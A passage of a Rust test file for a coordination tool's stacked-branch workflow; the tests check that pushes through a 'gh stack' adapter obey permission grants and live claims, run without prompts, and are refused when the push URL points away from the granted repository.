//! Stack-tool enforcement: plain operations on a dependent branch are
//! refused, the typed `gh stack` adapter runs non-interactively with an
//! explicit remote, doctor reports a missing tool, and a merged base yields
//! per-writer retarget steps. The adapter runs a recording stand-in for
//! `gh`, not the real extension; everything else uses temporary stores.

mod common;
mod workflows_support;

use std::{
    cell::{Cell, RefCell},
    collections::BTreeSet,
    time::Duration,
};

use common::{TestResult, commit, ttl};
use kitchen::{
    BackendId, TaskId,
    contracts::{
        BranchName, CommitId, ContractError, Fence, Grant, HouseGrants, IssueNumber, Permission,
        Repository, TaskAuthority, Workspace,
    },
    house::{DoctorCode, StackTool, StackToolStatus, Workflow, stack_tool_finding},
    state::StateError,
    workflows::{
        coordination::{LaunchOutcome, launch_worker},
        pickup::{ClaimOutcome, TaskTemplate, claim_issue, issue_task_id},
        push::{
            PullRequests, PushIntent, PushPermit, PushRefusal, RefUpdater, RemoteBranches,
            UpdateFailure,
        },
        repair::{Mergeability, Observed, PullRequestState, PullRequestView},
        stack::{
            BranchLayer, BranchOperation, Dependent, GhStack, MAX_STACK_LAYERS, MergedBase,
            RetargetStep, StackBoundary, StackCommand, StackLayerView, StackOutcome, StackRefusal,
            StackResult, StackRunner, StackView, Upstack, check_plain, plan_retarget, upstack,
        },
    },
};
use workflows_support::{World, branch, brief, issue, template, under_consumer};

// Plain paths.

#[test]
fn plain_operations_on_a_dependent_branch_are_refused_under_a_stack_tool() -> TestResult {
    let dependent = BranchLayer::Dependent {
        parent: branch("lemarier/issue-4")?,
    };
    for operation in [
        BranchOperation::Create,
        BranchOperation::Rebase,
        BranchOperation::Retarget,
        BranchOperation::Push,
    ] {
        assert_eq!(
            check_plain(Some(StackTool::GhStack), &dependent, operation),
            Err(StackRefusal::StackToolRequired {
                tool: StackTool::GhStack,
                operation
            })
        );
        assert_eq!(check_plain(None, &dependent, operation), Ok(()));
        assert_eq!(
            check_plain(
                Some(StackTool::GhStack),
                &BranchLayer::Independent,
                operation
            ),
            Ok(())
        );
    }
    Ok(())
}

// The stack boundary.

/// Answers `view` for [`StackCommand::View`] and `answer` for the rest, and
/// records every other command it ran.
struct Recording {
    commands: RefCell<Vec<StackCommand>>,
    view: StackResult,
    answer: StackResult,
}

impl Recording {
    fn answering(answer: StackResult) -> TestResult<Self> {
        Ok(Self {
            commands: RefCell::new(Vec::new()),
            view: StackResult::Viewed(stack_view(&[("lemarier/issue-5", false)])?),
            answer,
        })
    }

    fn with_view(mut self, view: StackResult) -> Self {
        self.view = view;
        self
    }

    fn ran(&self) -> Vec<StackCommand> {
        self.commands.borrow().clone()
    }
}

impl StackRunner for Recording {
    fn run(&self, command: &StackCommand) -> StackResult {
        if command == &StackCommand::View {
            return self.view.clone();
        }
        self.commands.borrow_mut().push(command.clone());
        self.answer.clone()
    }
}

/// A stack on `main`, bottom to top: each layer's name and whether it merged.
fn stack_view(layers: &[(&str, bool)]) -> TestResult<StackView> {
    Ok(StackView {
        trunk: branch("main")?,
        branches: layers
            .iter()
            .map(|(name, merged)| {
                Ok(StackLayerView {
                    name: branch(name)?,
                    is_merged: *merged,
                    needs_rebase: false,
                    pr: None,
                })
            })
            .collect::<TestResult<_>>()?,
    })
}

/// Scripted pull-request and remote reads.
struct Remote {
    pull_request: Observed<Option<PullRequestView>>,
    head: Observed<Option<CommitId>>,
    bound: Observed<bool>,
    pushes: Observed<bool>,
    reads: Cell<u32>,
}

impl Remote {
    fn open() -> TestResult<Self> {
        Ok(Self {
            pull_request: Observed::Known(Some(pr_view(PullRequestState::Open)?)),
            head: Observed::Known(Some(commit('d')?)),
            bound: Observed::Known(true),
            pushes: Observed::Known(true),
            reads: Cell::new(0),
        })
    }
}

impl PullRequests for Remote {
    fn pull_request(&self, _: IssueNumber) -> Observed<Option<PullRequestView>> {
        self.reads.set(self.reads.get() + 1);
        self.pull_request.clone()
    }

    fn default_branch(&self) -> Observed<BranchName> {
        BranchName::new("main").map_or(Observed::Unknown, Observed::Known)
    }
}

impl RemoteBranches for Remote {
    fn reads_from(&self, _: &Repository) -> Observed<bool> {
        self.bound
    }

    fn head(&self, _: &BranchName) -> Observed<Option<CommitId>> {
        self.reads.set(self.reads.get() + 1);
        self.head.clone()
    }
}

impl RefUpdater for Remote {
    fn pushes_to(&self, _: &Repository) -> Observed<bool> {
        self.pushes
    }

    /// The stack path never updates a ref itself; the tool does.
    fn update(&self, _: &PushPermit, _: &BranchName, _: &CommitId) -> Result<(), UpdateFailure> {
        Err(UpdateFailure::Rejected)
    }
}

fn pr_view(state: PullRequestState) -> TestResult<PullRequestView> {
    Ok(PullRequestView {
        number: number(5)?,
        state,
        head: commit('d')?,
        head_branch: "lemarier/issue-5".to_owned(),
        base_branch: "lemarier/issue-4".to_owned(),
        mergeability: Mergeability::Clean,
    })
}

fn intent() -> TestResult<PushIntent> {
    Ok(PushIntent {
        pull_request: Some(number(5)?),
        expected_remote: Some(commit('d')?),
    })
}

struct Stacking {
    world: World,
    task: TaskId,
    fence: Fence,
    github: BackendId,
}

/// Claim issue `number` with `requested` and launch its worker on
/// `lemarier/issue-<number>`.
fn claim_and_launch(
    world: &World,
    number: u64,
    template: &TaskTemplate,
) -> TestResult<(TaskId, Fence)> {
    // The first task is claimed under the pickup consumer; the others, like
    // tasks another coordinator holds, directly.
    let claimant = if number == 5 {
        under_consumer(world, "coordinator")?.0
    } else {
        common::scheduled(&format!("coordinator-{number}"))?
    };
    let ClaimOutcome::Claimed(lease) = claim_issue(
        &world.fixture.store,
        template,
        &issue(number)?,
        &claimant,
        ttl(300)?,
        world.now(),
    )?
    else {
        return Err("issue not claimed".into());
    };
    let task = issue_task_id(&issue(number)?)?;
    match launch_worker(
        &world.ctx(),
        &task,
        lease.fence(),
        Workspace::Isolated,
        &brief(number)?,
    )? {
        LaunchOutcome::Accepted { .. } => Ok((task, lease.fence())),
        other => Err(format!("launch not accepted: {other:?}").into()),
    }
}

fn worker_grants() -> TestResult<Vec<Grant>> {
    common::WORKER_PERMISSIONS
        .iter()
        .map(|permission| common::grant(*permission))
        .collect()
}

/// A template allowing `attempts` attempts, delegated worker lifecycle from
/// `world`'s grants.
fn worker_template(world: &World, attempts: u32) -> TestResult<TaskTemplate> {
    let mut spec = workflows_support::template_with(attempts, workflows_support::provenance('a')?)?;
    spec.authority = TaskAuthority::delegate(&world.grants, worker_grants()?)?;
    Ok(spec)
}

fn stacking_with(house: &[Grant], requested: Vec<Grant>) -> TestResult<Stacking> {
    let mut world = World::new()?;
    world.grants = HouseGrants::new(common::house()?, house.to_vec());
    let mut spec: TaskTemplate = template()?;
    spec.authority = TaskAuthority::delegate(&world.grants, requested)?;
    let (task, fence) = claim_and_launch(&world, 5, &spec)?;
    Ok(Stacking {
        world,
        task,
        fence,
        github: BackendId::new("github")?,
    })
}

fn github_grant(permission: Permission) -> TestResult<Grant> {
    Ok(Grant::repository(
        permission,
        workflows_support::repo()?,
        BackendId::new("github")?,
        common::credential()?,
    ))
}

/// A task delegated worker lifecycle and the given GitHub permissions.
fn stacking_granted(permissions: &[Permission]) -> TestResult<Stacking> {
    let mut grants = worker_grants()?;
    for permission in permissions {
        grants.push(github_grant(*permission)?);
    }
    stacking_with(&grants, grants.clone())
}

fn stacking() -> TestResult<Stacking> {
    stacking_granted(&[
        Permission::PushBranch,
        Permission::OpenPullRequest,
        Permission::RequestReview,
    ])
}

fn boundary<'a>(
    setup: &'a Stacking,
    runner: &'a Recording,
    remote: &'a Remote,
) -> StackBoundary<'a> {
    StackBoundary {
        store: &setup.world.fixture.store,
        grants: &setup.world.grants,
        destination: &setup.github,
        clock: &setup.world.clock,
        runner,
        pull_requests: remote,
        remote,
        updater: remote,
    }
}

fn run(setup: &Stacking, runner: &Recording, command: &StackCommand) -> TestResult<StackOutcome> {
    let remote = Remote::open()?;
    Ok(boundary(setup, runner, &remote).run(&setup.task, setup.fence, command, &intent()?)?)
}

#[test]
fn the_stack_tool_path_runs_commands_bound_to_the_tasks_branch() -> TestResult {
    let setup = stacking()?;
    let runner = Recording::answering(StackResult::Done)?;
    // Adopting an existing chain that contains the task's branch.
    let adopt = StackCommand::Adopt {
        trunk: branch("main")?,
        branches: vec![
            branch("lemarier/issue-4")?,
            branch("lemarier/issue-5")?,
            branch("lemarier/issue-6")?,
        ],
    };
    let accepted = [
        adopt,
        StackCommand::Add {
            branch: branch("lemarier/issue-5")?,
        },
        StackCommand::RebaseUpstack,
        StackCommand::Push,
        StackCommand::Submit { ready: false },
        StackCommand::Submit { ready: true },
    ];
    for command in &accepted {
        assert_eq!(
            run(&setup, &runner, command)?,
            StackOutcome::Ran(StackResult::Done)
        );
    }
    assert_eq!(runner.ran(), accepted.to_vec());
    Ok(())
}

#[test]
fn the_stack_boundary_refuses_other_branches_and_bad_chains() -> TestResult {
    let setup = stacking()?;
    let runner = Recording::answering(StackResult::Done)?;
    let too_many: Vec<_> = (0..=MAX_STACK_LAYERS)
        .map(|layer| branch(&format!("lemarier/layer-{layer}")))
        .chain([branch("lemarier/issue-5")])
        .collect::<TestResult<_>>()?;
    let adopt = |branches: Vec<BranchName>| -> TestResult<StackCommand> {
        Ok(StackCommand::Adopt {
            trunk: branch("main")?,
            branches,
        })
    };
    let refused = [
        (
            StackCommand::Add {
                branch: branch("lemarier/issue-6")?,
            },
            StackRefusal::ForeignBranch,
        ),
        (
            adopt(vec![branch("lemarier/issue-4")?])?,
            StackRefusal::ForeignBranch,
        ),
        (adopt(Vec::new())?, StackRefusal::InvalidLayers),
        (
            adopt(vec![
                branch("lemarier/issue-5")?,
                branch("lemarier/issue-5")?,
            ])?,
            StackRefusal::InvalidLayers,
        ),
        (adopt(too_many)?, StackRefusal::InvalidLayers),
    ];
    for (command, refusal) in refused {
        assert_eq!(
            run(&setup, &runner, &command)?,
            StackOutcome::Refused(refusal)
        );
    }
    assert!(runner.ran().is_empty());
    Ok(())
}

#[test]
fn who_works_above_is_derived_from_the_stack_and_the_houses_tasks() -> TestResult {
    let setup = stacking()?;
    // Issue 6 is claimed and its worker runs on the layer above.
    claim_and_launch(&setup.world, 6, &worker_template(&setup.world, 3)?)?;
    let store = &setup.world.fixture.store;
    let own = branch("lemarier/issue-5")?;
    let cases = [
        (vec![("lemarier/issue-5", false)], Upstack::Top),
        // A merged layer above is nobody's work.
        (
            vec![("lemarier/issue-5", false), ("lemarier/issue-6", true)],
            Upstack::Top,
        ),
        (
            vec![("lemarier/issue-5", false), ("lemarier/issue-6", false)],
            Upstack::Busy,
        ),
        // No task of this house owns the layer: a person may.
        (
            vec![("lemarier/issue-5", false), ("lemarier/person", false)],
            Upstack::Unknown,
        ),
        // The task's branch is not in the stack at all.
        (vec![("lemarier/issue-4", false)], Upstack::Unknown),
    ];
    for (layers, expected) in cases {
        assert_eq!(
            upstack(store, &stack_view(&layers)?, &own)?,
            expected,
            "{layers:?}"
        );
    }

    // Commands that rewrite or push upper layers need them free.
    let busy = StackResult::Viewed(stack_view(&[
        ("lemarier/issue-5", false),
        ("lemarier/issue-6", false),
    ])?);
    for (view, command) in [
        (busy.clone(), StackCommand::RebaseUpstack),
        (busy, StackCommand::Submit { ready: true }),
        (StackResult::Locked, StackCommand::Push),
        (StackResult::Uncertain, StackCommand::Push),
    ] {
        let runner = Recording::answering(StackResult::Done)?.with_view(view);
        assert_eq!(
            run(&setup, &runner, &command)?,
            StackOutcome::Refused(StackRefusal::UpstackBusy)
        );
        assert!(runner.ran().is_empty());
    }
    Ok(())
}

#[test]
fn a_settled_task_above_leaves_the_upper_layer_idle() -> TestResult {
    use kitchen::contracts::{WorkerOutcome, WorkerState};
    use kitchen::workflows::coordination::{SupervisionInput, supervise};
    let setup = stacking()?;
    let (task, fence) = claim_and_launch(&setup.world, 6, &worker_template(&setup.world, 1)?)?;
    let record = setup.world.fixture.store.task(&task)?;
    let worker = kitchen::workflows::coordination::current_worker(&record)
        .ok_or("no worker")?
        .worker;
    setup
        .world
        .backend
        .set_worker_state(&worker, WorkerState::Settled(WorkerOutcome::Failed));
    supervise(
        &setup.world.ctx(),
        &task,
        fence,
        &workflows_support::supervision()?,
        &SupervisionInput::default(),
    )?;
    let view = stack_view(&[("lemarier/issue-5", false), ("lemarier/issue-6", false)])?;
    assert_eq!(
        upstack(
            &setup.world.fixture.store,
            &view,
            &branch("lemarier/issue-5")?
        )?,
        Upstack::Idle
    );
    let runner = Recording::answering(StackResult::Done)?.with_view(StackResult::Viewed(view));
    assert_eq!(
        run(&setup, &runner, &StackCommand::Push)?,
        StackOutcome::Ran(StackResult::Done)
    );
    Ok(())
}

#[test]
fn the_stack_path_runs_the_push_boundarys_checks_first() -> TestResult {
    let setup = stacking()?;
    let with = |change: &dyn Fn(&mut Remote)| -> TestResult<Remote> {
        let mut remote = Remote::open()?;
        change(&mut remote);
        Ok(remote)
    };
    let cases: Vec<(&str, Remote, PushRefusal)> = vec![
        (
            "merged",
            with(&|remote| {
                remote.pull_request = pr_view(PullRequestState::Merged)
                    .map_or(Observed::Unknown, |view| Observed::Known(Some(view)));
            })?,
            PushRefusal::Merged,
        ),
        (
            "closed",
            with(&|remote| {
                remote.pull_request = pr_view(PullRequestState::Closed)
                    .map_or(Observed::Unknown, |view| Observed::Known(Some(view)));
            })?,
            PushRefusal::Closed,
        ),
        (
            "deleted",
            with(&|remote| remote.head = Observed::Known(None))?,
            PushRefusal::BranchDeleted,
        ),
        (
            "moved",
            with(&|remote| {
                remote.head = commit('f').map_or(Observed::Unknown, |id| Observed::Known(Some(id)))
            })?,
            PushRefusal::RemoteMoved {
                found: commit('f')?,
            },
        ),
        (
            "unreadable",
            with(&|remote| remote.head = Observed::Unknown)?,
            PushRefusal::Unknown,
        ),
        (
            "another repository",
            with(&|remote| remote.bound = Observed::Known(false))?,
            PushRefusal::RemoteMismatch,
        ),
    ];
    for command in [
        StackCommand::Push,
        StackCommand::Submit { ready: false },
        StackCommand::RebaseUpstack,
    ] {
        for (name, remote, refusal) in &cases {
            let runner = Recording::answering(StackResult::Done)?;
            let outcome = boundary(&setup, &runner, remote).run(
                &setup.task,
                setup.fence,
                &command,
                &intent()?,
            )?;
            assert_eq!(
                outcome,
                StackOutcome::Refused(StackRefusal::Push(refusal.clone())),
                "{name} {command:?}"
            );
            assert!(runner.ran().is_empty(), "{name} ran the tool");
        }
    }
    Ok(())
}

#[test]
fn the_stack_path_refuses_a_push_url_that_is_not_the_granted_repository() -> TestResult {
    let setup = stacking()?;
    for (pushes, refusal) in [
        (Observed::Known(false), PushRefusal::RemoteMismatch),
        (Observed::Unknown, PushRefusal::Unknown),
    ] {
        // Fetches read the granted repository; only the push URL differs.
        let mut remote = Remote::open()?;
        remote.pushes = pushes;
        for command in [
            StackCommand::Push,
            StackCommand::Submit { ready: false },
            StackCommand::RebaseUpstack,
        ] {
            let runner = Recording::answering(StackResult::Done)?;
            let outcome = boundary(&setup, &runner, &remote).run(
                &setup.task,
                setup.fence,
                &command,
                &intent()?,
            )?;
            assert_eq!(
                outcome,
                StackOutcome::Refused(StackRefusal::Push(refusal.clone())),
                "{pushes:?} {command:?}"
            );
            assert!(runner.ran().is_empty(), "{pushes:?} ran the tool");
        }
    }
    // With both URLs on the granted repository the same command runs.
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        boundary(&setup, &runner, &Remote::open()?).run(
            &setup.task,
            setup.fence,
            &StackCommand::Push,
            &intent()?
        )?,
        StackOutcome::Ran(StackResult::Done)
    );
    Ok(())
}

#[test]
fn a_stack_push_is_recorded_so_a_first_push_cannot_recreate_the_branch() -> TestResult {
    let setup = stacking()?;
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        run(&setup, &runner, &StackCommand::Push)?,
        StackOutcome::Ran(StackResult::Done)
    );
    // The pull request merged and its branch was deleted: a "first push"
    // intent must not recreate it, and dropping the pull request is refused.
    let mut gone = Remote::open()?;
    gone.head = Observed::Known(None);
    gone.pull_request = Observed::Known(None);
    let first = PushIntent {
        pull_request: Some(number(5)?),
        expected_remote: None,
    };
    gone.pull_request = Observed::Known(Some(pr_view(PullRequestState::Open)?));
    assert_eq!(
        boundary(&setup, &runner, &gone).run(
            &setup.task,
            setup.fence,
            &StackCommand::Push,
            &first
        )?,
        StackOutcome::Refused(StackRefusal::Push(PushRefusal::BranchDeleted))
    );
    let unnamed = PushIntent {
        pull_request: None,
        expected_remote: None,
    };
    assert_eq!(
        boundary(&setup, &runner, &gone).run(
            &setup.task,
            setup.fence,
            &StackCommand::Push,
            &unnamed
        )?,
        StackOutcome::Refused(StackRefusal::Push(PushRefusal::PullRequestRequired))
    );
    assert_eq!(runner.ran(), vec![StackCommand::Push]);
    Ok(())
}

#[test]
fn a_submission_needs_the_grants_it_exercises() -> TestResult {
    // Only `push-branch`: pushing runs, opening pull requests does not.
    let setup = stacking_granted(&[Permission::PushBranch])?;
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        run(&setup, &runner, &StackCommand::Push)?,
        StackOutcome::Ran(StackResult::Done)
    );
    assert!(matches!(
        run(&setup, &runner, &StackCommand::Submit { ready: false }),
        Err(error) if matches!(
            error.downcast_ref::<kitchen::Error>(),
            Some(kitchen::Error::Contract(ContractError::PermissionDenied {
                permission: Permission::OpenPullRequest
            }))
        )
    ));
    // Marking pull requests ready asks for their review.
    let setup = stacking_granted(&[Permission::PushBranch, Permission::OpenPullRequest])?;
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        run(&setup, &runner, &StackCommand::Submit { ready: false })?,
        StackOutcome::Ran(StackResult::Done)
    );
    assert!(matches!(
        run(&setup, &runner, &StackCommand::Submit { ready: true }),
        Err(error) if matches!(
            error.downcast_ref::<kitchen::Error>(),
            Some(kitchen::Error::Contract(ContractError::PermissionDenied {
                permission: Permission::RequestReview
            }))
        )
    ));
    assert_eq!(runner.ran(), vec![StackCommand::Submit { ready: false }]);
    Ok(())
}

#[test]
fn the_stack_boundary_needs_the_live_claim_and_the_push_grant() -> TestResult {
    let runner = Recording::answering(StackResult::Done)?;
    // No delegated push grant for this repository.
    let other = Grant::repository(
        Permission::PushBranch,
        kitchen::contracts::Repository::new("origin89hq/other")?,
        BackendId::new("github")?,
        common::credential()?,
    );
    let mut house = worker_grants()?;
    house.extend([github_grant(Permission::PushBranch)?, other.clone()]);
    let mut requested = worker_grants()?;
    requested.push(other);
    let unauthorized = stacking_with(&house, requested)?;
    assert!(run(&unauthorized, &runner, &StackCommand::Push).is_err());
    // An expired claim is stale.
    let setup = stacking()?;
    setup.world.clock.advance(301);
    let remote = Remote::open()?;
    let result = boundary(&setup, &runner, &remote).run(
        &setup.task,
        setup.fence,
        &StackCommand::Push,
        &intent()?,
    );
    assert!(matches!(
        result,
        Err(kitchen::Error::State(StateError::StaleFence { .. }))
    ));
    assert!(runner.ran().is_empty());
    assert_eq!(remote.reads.get(), 0);
    Ok(())
}

#[test]
fn a_persons_branch_is_never_pushed_through_the_stack_tool() -> TestResult {
    use kitchen::contracts::WorkerState;
    use kitchen::workflows::coordination::{Supervision, SupervisionInput, supervise};
    let setup = stacking()?;
    let record = setup.world.fixture.store.task(&setup.task)?;
    let worker = kitchen::workflows::coordination::current_worker(&record)
        .ok_or("no worker")?
        .worker;
    setup
        .world
        .backend
        .set_worker_state(&worker, WorkerState::UserTakeover);
    assert_eq!(
        supervise(
            &setup.world.ctx(),
            &setup.task,
            setup.fence,
            &workflows_support::supervision()?,
            &SupervisionInput::default(),
        )?,
        Supervision::PersonOwnsTerminal
    );
    let runner = Recording::answering(StackResult::Done)?;
    for command in [StackCommand::Push, StackCommand::View] {
        assert_eq!(
            run(&setup, &runner, &command)?,
            StackOutcome::Refused(StackRefusal::Push(PushRefusal::BranchHeld))
        );
    }
    assert!(runner.ran().is_empty());
    Ok(())
}

// The gh-stack adapter.

#[test]
fn gh_stack_commands_are_non_interactive_with_an_explicit_remote() -> TestResult {
    let gh = GhStack::new(
        "/usr/bin/gh".into(),
        "/tmp/checkout".into(),
        "upstream",
        Duration::from_secs(5),
    )?;
    let cases = [
        (
            StackCommand::Adopt {
                trunk: branch("main")?,
                branches: vec![branch("lemarier/a")?, branch("lemarier/b")?],
            },
            "stack init --base main lemarier/a lemarier/b",
        ),
        (
            StackCommand::Add {
                branch: branch("lemarier/c")?,
            },
            "stack add lemarier/c",
        ),
        (
            StackCommand::RebaseUpstack,
            "stack rebase --upstack --remote upstream",
        ),
        (StackCommand::Push, "stack push --remote upstream"),
        (
            StackCommand::Submit { ready: false },
            "stack submit --auto --remote upstream",
        ),
        (
            StackCommand::Submit { ready: true },
            "stack submit --auto --open --remote upstream",
        ),
        (StackCommand::View, "stack view --json"),
    ];
    for (command, expected) in cases {
        assert_eq!(gh.args(&command).join(" "), expected);
    }
    for (git, checkout, remote, deadline) in [
        ("gh", "/tmp", "origin", 5),
        ("/usr/bin/gh", "tmp", "origin", 5),
        ("/usr/bin/gh", "/tmp", "-origin", 5),
        ("/usr/bin/gh", "/tmp", "a b", 5),
        ("/usr/bin/gh", "/tmp", "origin", 0),
    ] {
        assert!(
            GhStack::new(
                git.into(),
                checkout.into(),
                remote,
                Duration::from_secs(deadline)
            )
            .is_err()
        );
    }
    Ok(())
}

#[cfg(unix)]
mod gh_process {
    use std::{fs, os::unix::fs::PermissionsExt, path::Path, time::Duration};

    use super::*;

    /// A stand-in for `gh` that records its arguments, whether stdin and
    /// stdout are terminals, and the prompt setting, then prints `stdout`
    /// and exits with `code`.
    fn fake_gh(dir: &Path, stdout: &str, code: i32) -> TestResult<std::path::PathBuf> {
        let path = dir.join("gh");
        let log = dir.join("log");
        fs::write(
            &path,
            format!(
                "#!/bin/sh\n\
                 printf '%s\\n' \"$*\" >> '{log}'\n\
                 if [ -t 0 ]; then echo stdin-tty >> '{log}'; fi\n\
                 if [ -t 1 ]; then echo stdout-tty >> '{log}'; fi\n\
                 echo \"prompt=$GH_PROMPT_DISABLED editor=$GIT_EDITOR\" >> '{log}'\n\
                 printf '%s' '{stdout}'\n\
                 exit {code}\n",
                log = log.display(),
            ),
        )?;
        fs::set_permissions(&path, fs::Permissions::from_mode(0o755))?;
        Ok(path)
    }

    fn adapter(gh: std::path::PathBuf, dir: &Path) -> TestResult<GhStack> {
        Ok(GhStack::new(
            gh,
            dir.to_path_buf(),
            "origin",
            Duration::from_secs(5),
        )?)
    }

    #[test]
    fn the_adapter_never_gives_gh_a_terminal_or_a_prompt() -> TestResult {
        let temp = tempfile::tempdir()?;
        let dir = temp.path().canonicalize()?;
        let gh = adapter(fake_gh(&dir, "", 0)?, &dir)?;
        assert_eq!(gh.run(&StackCommand::Push), StackResult::Done);
        let log = fs::read_to_string(dir.join("log"))?;
        assert_eq!(
            log, "stack push --remote origin\nprompt=1 editor=true\n",
            "no terminal on stdin or stdout, prompts disabled"
        );
        Ok(())
    }

    #[test]
    fn gh_stack_exit_codes_and_views_are_typed() -> TestResult {
        let temp = tempfile::tempdir()?;
        let dir = temp.path().canonicalize()?;
        let view = r#"{"trunk":"main","currentBranch":"lemarier/b","branches":[{"name":"lemarier/a","isMerged":true,"needsRebase":false,"pr":{"number":41,"state":"MERGED"}},{"name":"lemarier/b","isMerged":false,"needsRebase":true}]}"#;
        let viewed = adapter(fake_gh(&dir, view, 0)?, &dir)?.run(&StackCommand::View);
        let StackResult::Viewed(stack) = viewed else {
            return Err(format!("view not parsed: {viewed:?}").into());
        };
        assert_eq!(stack.trunk, branch("main")?);
        assert_eq!(stack.branches.len(), 2);
        let bottom = stack.branches.first().ok_or("no bottom layer")?;
        assert!(bottom.is_merged);
        assert_eq!(bottom.pr.map(|pr| pr.number), Some(IssueNumber::new(41)?));
        assert!(
            stack
                .branches
                .get(1)
                .is_some_and(|layer| layer.needs_rebase && layer.pr.is_none())
        );
        for (code, command, expected) in [
            (3, StackCommand::RebaseUpstack, StackResult::Conflict),
            (
                7,
                StackCommand::RebaseUpstack,
                StackResult::RebaseInProgress,
            ),
            (8, StackCommand::Push, StackResult::Locked),
            (2, StackCommand::View, StackResult::NotInStack),
            (5, StackCommand::View, StackResult::Rejected),
            // A generic failure may follow a partial push.
            (1, StackCommand::Push, StackResult::Uncertain),
            (1, StackCommand::View, StackResult::Rejected),
            // Unparseable view output is not a stack.
            (0, StackCommand::View, StackResult::Uncertain),
        ] {
            let temp = tempfile::tempdir()?;
            let dir = temp.path().canonicalize()?;
            let gh = adapter(fake_gh(&dir, "not json", code)?, &dir)?;
            assert_eq!(gh.run(&command), expected, "exit {code}");
        }
        Ok(())
    }

    #[test]
    fn doctor_detection_reports_the_installed_version_or_a_missing_tool() -> TestResult {
        let temp = tempfile::tempdir()?;
        let dir = temp.path().canonicalize()?;
        let deadline = Duration::from_secs(5);
        let installed = fake_gh(&dir, "gh stack version 0.1.0\n", 0)?;
        assert_eq!(
            GhStack::detect(&installed, &dir, deadline),
            Some(StackToolStatus::Installed {
                version: "0.1.0".to_owned()
            })
        );
        let other = tempfile::tempdir()?;
        let other = other.path().canonicalize()?;
        let absent = fake_gh(&other, "unknown command \"stack\" for \"gh\"", 1)?;
        assert_eq!(
            GhStack::detect(&absent, &other, deadline),
            Some(StackToolStatus::Missing)
        );
        assert_eq!(
            GhStack::detect(&dir.join("no-such-gh"), &dir, deadline),
            Some(StackToolStatus::Missing)
        );
        // A probe that does not finish is not evidence.
        let slow = dir.join("slow-gh");
        fs::write(&slow, "#!/bin/sh\nsleep 5\n")?;
        fs::set_permissions(&slow, fs::Permissions::from_mode(0o755))?;
        assert_eq!(
            GhStack::detect(&slow, &dir, Duration::from_millis(200)),
            None
        );
        Ok(())
    }

    const GIT: &str = "/usr/bin/git";

    fn git(dir: &Path, args: &[&str]) -> TestResult<String> {
        let output = std::process::Command::new(GIT)
            .args([
                "-c",
                "user.name=Kitchen Test",
                "-c",
                "user.email=kitchen@example.invalid",
                "-c",
                "commit.gpgsign=false",
                "-c",
                "init.defaultBranch=main",
            ])
            .args(args)
            .current_dir(dir)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .output()?;
        if !output.status.success() {
            return Err(format!(
                "git {args:?} failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )
            .into());
        }
        Ok(String::from_utf8(output.stdout)?.trim().to_owned())
    }

    fn text(path: &Path) -> TestResult<&str> {
        Ok(path.to_str().ok_or("non-UTF-8 path")?)
    }

    /// The granted repository `origin89hq/firmware` as a bare repository
    /// under the temporary directory (the URL base) and the worker's clone.
    fn granted_clone(root: &Path) -> TestResult<(std::path::PathBuf, std::path::PathBuf)> {
        let bare = root.join("origin89hq").join("firmware.git");
        fs::create_dir_all(&bare)?;
        git(&bare, &["init", "--bare"])?;
        let worker = root.join("worker");
        git(root, &["clone", text(&bare)?, text(&worker)?])?;
        Ok((bare, worker))
    }

    #[test]
    fn a_divergent_push_url_is_refused_before_gh_stack_runs() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker) = granted_clone(&root)?;
        let elsewhere = root.join("elsewhere").join("firmware.git");
        fs::create_dir_all(&elsewhere)?;
        git(&elsewhere, &["init", "--bare"])?;
        let setup = stacking()?;
        let gh = adapter(fake_gh(&root, "", 0)?, &worker)?;
        let remote = gh
            .git_remote(GIT.into(), Duration::from_secs(30))?
            .with_url_bases(&[&format!("{}/", text(&root)?)])?;
        // The fetch URL is the granted repository, so a fetch-only check
        // passes; only the push URL, or its rewrite, leaves.
        let other = text(&elsewhere)?.to_owned();
        let granted = text(&bare)?.to_owned();
        let redirects: [(&str, Vec<String>); 2] = [
            (
                "pushurl",
                vec![
                    "config".into(),
                    "remote.origin.pushurl".into(),
                    other.clone(),
                ],
            ),
            (
                "pushInsteadOf",
                vec![
                    "config".into(),
                    format!("url.{other}.pushInsteadOf"),
                    granted.clone(),
                ],
            ),
        ];
        for (name, args) in &redirects {
            let args: Vec<&str> = args.iter().map(String::as_str).collect();
            git(&worker, &args)?;
            assert_eq!(
                remote.reads_from(&workflows_support::repo()?),
                Observed::Known(true),
                "{name}: the fetch URL is unchanged"
            );
            for command in [
                StackCommand::Push,
                StackCommand::Submit { ready: true },
                StackCommand::RebaseUpstack,
            ] {
                let outcome = StackBoundary {
                    store: &setup.world.fixture.store,
                    grants: &setup.world.grants,
                    destination: &setup.github,
                    clock: &setup.world.clock,
                    runner: &gh,
                    pull_requests: &Remote::open()?,
                    remote: &remote,
                    updater: &remote,
                }
                .run(&setup.task, setup.fence, &command, &intent()?)?;
                assert_eq!(
                    outcome,
                    StackOutcome::Refused(StackRefusal::Push(PushRefusal::RemoteMismatch)),
                    "{name} {command:?}"
                );
            }
            assert!(!root.join("log").exists(), "{name}: gh stack ran");
            git(&worker, &["config", "--unset-all", "remote.origin.pushurl"]).ok();
            git(
                &worker,
                &["config", "--remove-section", &format!("url.{other}")],
            )
            .ok();
        }
        Ok(())
    }

    #[test]
    fn gh_stack_runs_git_with_the_pinned_configuration() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (_, worker) = granted_clone(&root)?;
        // The worker's checkout asks for hooks, tags, and submodules.
        for (key, value) in [
            ("core.hooksPath", "/tmp/worker-hooks"),
            ("core.sshCommand", "worker-ssh"),
            ("push.followTags", "true"),
            ("push.recurseSubmodules", "on-demand"),
            ("remote.origin.mirror", "true"),
        ] {
            git(&worker, &["config", key, value])?;
        }
        // A stand-in `gh` whose own Git reads the configuration it would push
        // with.
        let gh_path = root.join("gh");
        fs::write(
            &gh_path,
            format!(
                "#!/bin/sh\nfor key in core.hooksPath core.sshCommand push.followTags \
                 push.recurseSubmodules remote.origin.mirror; do\n  \
                 echo \"$key=$({GIT} config --get $key)\" >> '{log}'\ndone\n",
                log = root.join("config-log").display()
